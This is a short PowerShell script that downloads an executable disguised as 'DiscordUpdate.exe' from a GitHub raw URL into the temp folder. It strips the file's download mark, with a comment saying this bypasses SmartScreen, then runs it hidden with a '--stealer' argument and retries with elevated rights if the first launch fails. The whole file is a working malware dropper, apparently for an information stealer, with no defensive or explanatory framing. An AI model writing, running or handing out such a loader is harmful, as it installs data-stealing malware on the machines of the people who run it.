$exePath = "$env:TEMP\DiscordUpdate.exe"
$url = "https://raw.githubusercontent.com/urho122-cpu/captcha/main/DiscordUpdate.exe"

try {
    (New-Object Net.WebClient).DownloadFile($url, $exePath)
    
    # Try to unblock the file (bypass SmartScreen)
    Unblock-File -Path $exePath -ErrorAction SilentlyContinue
    
    # Run it
    Start-Process $exePath -ArgumentList '--stealer' -WindowStyle Hidden
} catch {
    # Alternative method if first one fails
    try {
        Start-Process $exePath -ArgumentList '--stealer' -Verb RunAs -WindowStyle Hidden
    } catch {}
}
